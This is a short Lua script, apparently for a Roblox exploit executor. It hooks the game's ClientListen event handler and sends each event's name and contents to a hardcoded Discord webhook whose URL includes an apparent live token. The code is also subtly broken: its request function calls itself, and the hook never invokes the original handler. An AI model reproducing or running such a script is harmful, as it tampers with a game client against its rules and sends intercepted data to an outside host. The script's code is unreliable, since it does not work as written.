function request(msg)
	request{
		Url = "https://discord.com/api/webhooks/1324084236558532701/QhbB-OUxaScbiaItK9N71Ew5X6iWWsfd2nkPyVBzv5XGV4RppWumNOYyqXh5cmKTuPN1",
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"},
		Body = game:GetService("HttpService"):JSONEncode({
			["content"] = msg
		})
	}
end

local Events = require(game.ReplicatedStorage.Events)

hookfunction(Events.ClientListen, function(v1,v2)
	request("----- "..v1.." (ClientListen)".." -----")
	task.wait(1)
	request(game:GetService("HttpService"):JSONEncode((v2)))
	return Events.ClientListen
end)
